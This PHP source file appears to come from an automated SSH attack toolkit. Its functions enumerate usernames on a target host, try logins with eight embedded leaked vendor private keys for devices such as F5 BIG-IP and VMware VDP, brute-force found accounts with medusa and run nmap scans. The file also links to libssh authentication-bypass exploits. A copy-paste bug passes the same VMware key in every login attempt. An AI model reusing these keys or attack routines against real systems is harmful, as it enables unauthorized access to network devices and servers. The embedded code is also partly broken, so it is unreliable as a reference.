<?php


class service2ssh extends service2snmp {


    public function __construct($eth,$domain,$ip,$port,$service_protocol,$stream) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$stream);
    }

 
    public function ssh2enum($dico){
        $this->ssTitre("SSH Enumeration via dico");
        $check_user = trim($this->req_ret_str("python $this->dir_tools/ssh/ssh_enum.py -p $this->port $this->ip user_doesnt_exist_from_me 2> /dev/null | grep 'is a valid username' | sed \"s/is a valid username//g\" "));
        if (!empty($check_user)) {
            return $this->note("Target have OpenSSH more 7.7");
        }
          $dico = trim($dico);  
        $users_test = file($dico);
        foreach ($users_test as $user_test){
            $user_test = trim($user_test); 
           $check_user = trim($this->req_ret_str("python $this->dir_tools/ssh/ssh_enum.py -p $this->port $this->ip $user_test 2> /dev/null | grep 'is a valid username' | sed \"s/is a valid username//g\" "));
           if (!empty($check_user)) $this->yesUSERS($this->port2id, $check_user, "SSH Enum via openssh less 7.7", "");
        }
    }
    
    public function ssh2keys(){
    
        $this->ssTitre(__FUNCTION__);
        
        $private_key_ssh_rsa_str_vmware_vdp =<<<EOF
-----BEGIN RSA PRIVATE KEY-----
MIICWQIBAAKBgQCx/XgSpdlvoy1fABui75RYQFTRGPdkHBolTNIAeA91aPfnAr2X
/PuZR/DiHMCYcn6/8A5Jn75YOD3OL0mumJJR1uQ4pyhY+MSptiMYxhvDLIiRRo16
9jewWCSH/7jqWH8NhImpVxt5SjWtKhQInTdPkG1dCj8oSn87bt8fKvLcVQIBIwKB
gFuJq3dN+suzAWQOryCYeC1i6cqfICTbQKV39vjtScdajh8IuUbZ4Hq3SK7M9VW3
Od8NvjR+Ch691qSNWRf2saWS5MHiaYGF3xWwZokbJWJWmxlQ+Di9QAyRkjDIuMCR
Sj/vvCa6kWzZlSZWOyNbs38XkWoKXqVYwtnyXrINpZJTAkEA2p0ZrCKQTWBKt7aT
Rvx/8xnoYu9hSXIG1k11ql0HZdRpmveuZe64Gl6oJtgBZMXNdvAds+gvGTVCSfBO
c2ne0wJBANBt3t84oicWJpkzXnUBPOZdheKfAK6QO7weXiRmbILTJ5drPdu8pmxR
c1uQJgYitaSNKglJmz2WNOoaPZz/7zcCQBj8Au8Z5Jsg8pinJsZIvippXGMUCx5W
LKrHBiIZQqyNTeXTKd/DgsEvY6yq+NhRHsvDq5+IP+Wfr83vk+/u16MCQE1qozz3
xzMW2yL10qB8zXoivLNCX1bH26xFyzIXaiH2qE4vJZrCabM0MilSzEtr+lMP3GnZ
gs27cr1aNCRfD7UCQHOXGagsD/ijMGNcWPBQOY3foHzxozoBLGmysAmVz3vX6uyr
Y7oq9O5vDxwpMOAZ9JYTFuzEoWWg16L6SnNVYU4=
-----END RSA PRIVATE KEY-----
EOF;
        $private_key_ssh_rsa_str_Eaton_Xpert_Meter =<<<EOF
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQCfwugh3Y3mLbxw0q4RZZ5rfK3Qj8t1P81E6sXjhZl7C3FyH4Mj
C15CEzWovoQpRKrPdDaB5fVyuk6w2fKHrvHLmU2jTzq79B7A4JJEBQatAJeoVDgl
TyfL+q6BYAtAeNsho8eP/fMwrT2vhylNJ4BTsJbmdDJMoaaHu/0IB9Z9ywIBIwKB
gQCEX6plM+qaJeVHif3xKFAP6vZq+s0mopQjKO0bmpUczveZEsu983n8O81f7lA/
c2j1CITvSYI6fRyhKZ0RVnCRcaQ8h/grzZNdyyD3FcqDNKO7Xf+bvYySrQXhLeQP
I3jXGQPfBZUicGPcJclA98SBdBI1SReAUls1ZdzDwA3T8wJBAM6j1N3tYhdqal2W
gA1/WSQrFxTt28mFeUC8enGvKLRm1Nnxk/np9qy2L58BvZzCGyHAsZyVZ7Sqtfb3
YzqKMzUCQQDF7GrnrxNXWsIAli/UZscqIovN2ABRa2y8/JYPQAV/KRQ44vet2aaB
trQBK9czk0QLlBfXrKsofBW81+Swiwz/AkEAh8q/FX68zY8Ssod4uGmg+oK3ZYZd
O0kVKop8WVXY65QIN3LdlZm/W42qQ+szdaQgdUQc8d6F+mGNhQj4EIaz7wJAYCJf
z54t9zq2AEjyqP64gi4JY/szWr8mL+hmJKoRTGRo6G49yXhYMGAOSbY1U5CsBZ+z
zyf7XM6ONycIrYVeFQJABB8eqx/R/6Zwi8mVKMAF8lZXZB2dB+UOU12OGgvAHCKh
7izYQtGEgPDbklbvEZ31F7H2o337V6FkXQMFyQQdHA==
-----END RSA PRIVATE KEY-----
EOF;
        $private_key_ssh_rsa_str_Ceragon_FibeAir =<<<EOF
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQDBEh0OUdoiplc0P+XW8VPu57etz8O9eHbLHkQW27EZBEdXEYxr
MOFXi+PkA0ZcNDBRgjSJmHpo5WsPLwj/L3/L5gMYK+yeqsNu48ONbbqzZsFdaBQ+
IL3dPdMDovYo7GFVyXuaWMQ4hgAJEc+kk1hUaGKcLENQf0vEyt01eA/k6QIBIwKB
gQCwhZbohVm5R6AvxWRsv2KuiraQSO16B70ResHpA2AW31crCLrlqQiKjoc23mw3
CyTcztDy1I0stH8j0zts+DpSbYZnWKSb5hxhl/w96yNYPUJaTatgcPB46xOBDsgv
4Lf4GGt3gsQFvuTUArIf6MCJiUn4AQA9Q96QyCH/g4mdiwJBAPHdYgTDiQcpUAbY
SanIpq7XFeKXBPgRbAN57fTwzWVDyFHwvVUrpqc+SSwfzhsaNpE3IpLD9RqOyEr6
B8YrC2UCQQDMWrUeNQsf6xQer2AKw2Q06bTAicetJWz5O8CF2mcpVFYc1VJMkiuV
93gCvQORq4dpApJYZxhigY4k/f46BlU1AkAbpEW3Zs3U7sdRPUo/SiGtlOyO7LAc
WcMzmOf+vG8+xesCDOJwIj7uisaIsy1/cLXHdAPzhBwDCQDyoDtnGty7AkEAnaUP
YHIP5Ww0F6vcYBMSybuaEN9Q5KfXuPOUhIPpLoLjWBJGzVrRKou0WeJElPIJX6Ll
7GzJqxN8SGwqhIiK3wJAOQ2Hm068EicG5WQoS+8+KIE/SVHWmFDvet+f1vgDchvT
uPa5zx2eZ2rxP1pXHAdBSgh799hCF60eZZtlWnNqLg==
-----END RSA PRIVATE KEY-----
EOF;
        $private_key_ssh_rsa_str_F5_BIG_IP =<<<EOF
-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
-----END RSA PRIVATE KEY-----
EOF;
        $private_key_ssh_rsa_str_ExaGrid =<<<EOF
-----BEGIN RSA PRIVATE KEY-----
MIICWAIBAAKBgGdlD7qeGU9f8mdfmLmFemWMnz1tKeeuxKznWFI+6gkaagqjAF10
hIruzXQAik7TEBYZyvw9SvYU6MQFsMeqVHGhcXQ5yaz3G/eqX0RhRDn5T4zoHKZa
E1MU86zqAUdSXwHDe3pz5JEoGl9EUHTLMGP13T3eBJ19MAWjP7Iuji9HAgElAoGA
GSZrnBieX2pdjsQ55/AJA/HF3oJWTRysYWi0nmJUmm41eDV8oRxXl2qFAIqCgeBQ
BWA4SzGA77/ll3cBfKzkG1Q3OiVG/YJPOYLp7127zh337hhHZyzTiSjMPFVcanrg
AciYw3X0z2GP9ymWGOnIbOsucdhnbHPuSORASPOUOn0CQQC07Acq53rf3iQIkJ9Y
iYZd6xnZeZugaX51gQzKgN1QJ1y2sfTfLV6AwsPnieo7+vw2yk+Hl1i5uG9+XkTs
Ry45AkEAkk0MPL5YxqLKwH6wh2FHytr1jmENOkQu97k2TsuX0CzzDQApIY/eFkCj
QAgkI282MRsaTosxkYeG7ErsA5BJfwJAMOXYbHXp26PSYy4BjYzz4ggwf/dafmGz
ebQs+HXa8xGOreroPFFzfL8Eg8Ro0fDOi1lF7Ut/w330nrGxw1GCHQJAYtodBnLG
XLMvDHFG2AN1spPyBkGTUOH2OK2TZawoTmOPd3ymK28LriuskwxrceNb96qHZYCk
86DC8q8p2OTzYwJANXzRM0SGTqSDMnnid7PGlivaQqfpPOx8MiFR/cGr2dT1HD7y
x6f/85mMeTqamSxjTJqALHeKPYWyzeSnUrp+Eg==
-----END RSA PRIVATE KEY-----
EOF;
        
        $private_key_ssh_rsa_str_Loadbalancer =<<<EOF
-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQCsCgcOw+DgNR/7g+IbXYdOEwSB3W0o3l1Ep1ibHHvAtLb6AdNW
Gq47/UxY/rX3g2FVrVCtQwNSZMqkrqALQwDScxeCOiLMndCj61t3RxU3IOl5c/Hd
yhGh6JGPdzTpgf8VhJIZnvG+0NFNomYntqYFm0y11dBQPpYbJE7Tx1t/lQIVANHJ
rJSVVkpcTB4XdtR7TfO317xVAoGABDytZN2OhKwGyJfenZ1Ap2Y7lkO8V8tOtqX+
t0LkViOi2ErHJt39aRJJ1lDRa/3q0NNqZH4tnj/bh5dUyNapflJiV94N3637LCzW
cFlwFtJvD22Nx2UrPn+YXrzN7mt9qZyg5m0NlqbyjcsnCh4vNYUiNeMTHHW5SaJY
TeYmPP8CgYAjEe5+0m/TlBtVkqQbUit+s/g+eB+PFQ+raaQdL1uztW3etntXAPH1
MjxsAC/vthWYSTYXORkDFMhrO5ssE2rfg9io0NDyTIZt+VRQMGdi++dH8ptU+ldl
2ZejLFdTJFwFgcfXz+iQ1mx6h9TPX1crE1KoMAVOj3yKVfKpLB1EkAIUCsG3dIJH
SzmJVCWFyVuuANR2Bnc=
-----END DSA PRIVATE KEY-----
EOF;
        
        $private_key_ssh_rsa_str_Array_Networks =<<<EOF
-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQCUw7F/vKJT2Xsq+fIPVxNC/Dyk+dN9DWQT5RO56eIQasd+h6Fm
q1qtQrJ/DOe3VjfUrSm7NN5NoIGOrGCSuQFthFmq+9Lpt6WIykB4mau5iE5orbKM
xTfyu8LtntoikYKrlMB+UrmKDidvZ+7oWiC14imT+Px/3Q7naj0UmOrSTwIVAO25
Yf3SYNtTYv8yzaV+X9yNr/AfAoGADAcEh2bdsrDhwhXtVi1L3cFQx1KpN0B07JLr
gJzJcDLUrwmlMUmrXR2obDGfVQh46EFMeo/k3IESw2zJUS58FJW+sKZ4noSwRZPq
mpBnERKpLOTcWMxUyV8ETsz+9oz71YEMjmR1qvNYAopXf5Yy+4Zq3bgqmMMQyM+K
O1PdlCkCgYBmhSl9CVPgVMv1xO8DAHVhM1huIIK8mNFrzMJz+JXzBx81ms1kWSeQ
OC/nraaXFTBlqiQsvB8tzr4xZdbaI/QzVLKNAF5C8BJ4ScNlTIx1aZJwyMil8Nzb
+0YAsw5Ja+bEZZvEVlAYnd10qRWrPeEY1txLMmX3wDa+JvJL7fmuBgIUZoXsJnzs
+sqSEhA35Le2kC4Y1/A=
-----END DSA PRIVATE KEY-----
EOF;
        
        $private_key_ssh_rsa_str_Quantum =<<<EOF
-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQCEgBNwgF+IbMU8NHUXNIMfJ0ONa91ZI/TphuixnilkZqcuwur2
hMbrqY8Yne+n3eGkuepQlBBKEZSd8xPd6qCvWnCOhBqhkBS7g2dH6jMkUl/opX/t
Rw6P00crq2oIMafR4/SzKWVW6RQEzJtPnfV7O3i5miY7jLKMDZTn/DRXRwIVALB2
+o4CRHpCG6IBqlD/2JW5HRQBAoGAaSzKOHYUnlpAoX7+ufViz37cUa1/x0fGDA/4
6mt0eD7FTNoOnUNdfdZx7oLXVe7mjHjqjif0EVnmDPlGME9GYMdi6r4FUozQ33Y5
PmUWPMd0phMRYutpihaExkjgl33AH7mp42qBfrHqZ2oi1HfkqCUoRmB6KkdkFosr
E0apJ5cCgYBLEgYmr9XCSqjENFDVQPFELYKT7Zs9J87PjPS1AP0qF1OoRGZ5mefK
6X/6VivPAUWmmmev/BuAs8M1HtfGeGGzMzDIiU/WZQ3bScLB1Ykrcjk7TOFD6xrn
k/inYAp5l29hjidoAONcXoHmUAMYOKqn63Q2AsDpExVcmfj99/BlpQIUYS6Hs70u
B3Upsx556K/iZPPnJZE=
-----END DSA PRIVATE KEY-----
EOF;
        
        $private_key_str = $private_key_ssh_rsa_str_vmware_vdp;
        $hash = sha1($private_key_str);
        $file_name_path = "/tmp/$hash.priv";
        $remote_username = "admin" ;
        $info = "SSH Privkey:$private_key_str";
        $cmd_id = "id";
        
        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
        $this->stream4root($stream);
        
        
        $private_key_str = $private_key_ssh_rsa_str_Eaton_Xpert_Meter;
        $hash = sha1($private_key_str);
        $file_name_path = "/tmp/$hash.priv";
        $remote_username = "admin" ;
        $info = "SSH Privkey:$private_key_str";
        $cmd_id = "id";
        
        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
        $this->stream4root($stream);
        
        $private_key_str = $private_key_ssh_rsa_str_Ceragon_FibeAir;
        $hash = sha1($private_key_str);
        $file_name_path = "/tmp/$hash.priv";
        $remote_username = "mateidu" ;
        $info = "SSH Privkey:$private_key_str";
        $cmd_id = "id";
        
        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
        $this->stream4root($stream);
        
        $private_key_str = $private_key_ssh_rsa_str_F5_BIG_IP;
        $hash = sha1($private_key_str);
        $file_name_path = "/tmp/$hash.priv";
        $remote_username = "root" ;
        $info = "SSH Privkey:$private_key_str";
        $cmd_id = "id";
        
        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
        $this->stream4root($stream);
        
        $private_key_str = $private_key_ssh_rsa_str_ExaGrid;
        $hash = sha1($private_key_str);
        $file_name_path = "/tmp/$hash.priv";
        $remote_username = "root" ;
        $info = "SSH Privkey:$private_key_str";
        $cmd_id = "id";
        
        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
        $this->stream4root($stream);
        
        $private_key_str = $private_key_ssh_rsa_str_Loadbalancer;
        $hash = sha1($private_key_str);
        $file_name_path = "/tmp/$hash.priv";
        $remote_username = "root" ;
        $info = "SSH Privkey:$private_key_str";
        $cmd_id = "id";
        
        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
        $this->stream4root($stream);
        
        $private_key_str = $private_key_ssh_rsa_str_Array_Networks;
        $hash = sha1($private_key_str);
        $file_name_path = "/tmp/$hash.priv";
        $remote_username = "root" ;
        $info = "SSH Privkey:$private_key_str";
        $cmd_id = "id";
        
        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
        $this->stream4root($stream);
        
        
        $private_key_str = $private_key_ssh_rsa_str_Quantum;
        $hash = sha1($private_key_str);
        $file_name_path = "/tmp/$hash.priv";
        $remote_username = "root" ;
        $info = "SSH Privkey:$private_key_str";
        $cmd_id = "id";
        
        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
        $this->stream4root($stream);
        
        $this->pause();
        

    }
    
    public function ssh2nmap(){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $query = "echo '$this->root_passwd' | sudo -S nmap  --script \"ssh2-enum-algos\" -s$this->protocol -p $this->port -e $this->eth $this->ip -Pn -oX - ";
        $result .= $this->note("/etc/hosts.equiv: A new entry in the UNIX /etc/hosts.equiv file means that another remote host is considered trusted. The hosts.equiv file will list the hosts that are
trusted by the local machine.");
        $result .= $this->cmd("localhost", $query);
        $result .= $this->req_ret_str($query);
        
        $query = "echo '$this->root_passwd' | sudo -S nmap  --script  ssh-hostkey --script-args ssh_hostkey=all -s$this->protocol -p $this->port -e $this->eth $this->ip -Pn -oX - ";
        $result .= $this->cmd("localhost", $query);
        $result .= $this->req_ret_str($query);
        
        
        //if(!is_dir("/opt/libssh-scanner")) $this->install_scan4cli4ssh();
        $query = "cd /opt/libssh-scanner; python libsshscan.py $this->ip -p $this->port -a 2> /dev/null | grep $this->ip ";
        //$result .= $this->cmd("localhost", $query);	$result .= $this->req_ret_str($query);
        
        
        echo $result ;
        
        return $result;
    }
    public function service2ssh4exec(){


       
        $result = "";
        $this->titre(__FUNCTION__);
            
        

            /*
             *             $this->pause();
            
         https://www.marcolancini.it/2018/blog-libssh-auth-bypass/
         https://github.com/marco-lancini/hunt-for-cve-2018-10933
         https://github.com/0x4D31/hassh-utils
         https://github.com/blacknbunny/libssh-authentication-bypass
         https://gist.github.com/0x4D31/35ddb0322530414bbb4c3288292749cc
         https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/libssh_auth_bypass.md        
             
             */
            
        
        
                
            $this->pause();
            
            $users = $this->ip2users();
            foreach ($users as $user2name){
                if (!empty($user2name)){
                $this->article("USER FOUND FOR TEST", "$user2name");
                $this->port2auth4pass4medusa("ssh", $user2name, "password");
                //$result .= $this->port2auth4dico4medusa("ssh", $user2name);
                }
            }
            
            $this->pause();
            $result .= $this->ssh2nmap();
            //$this->ssh2keys();
            $this->pause();
            
            return $result;
        
    }
    

    
 
    
 
 
    

    
    

  }
?>
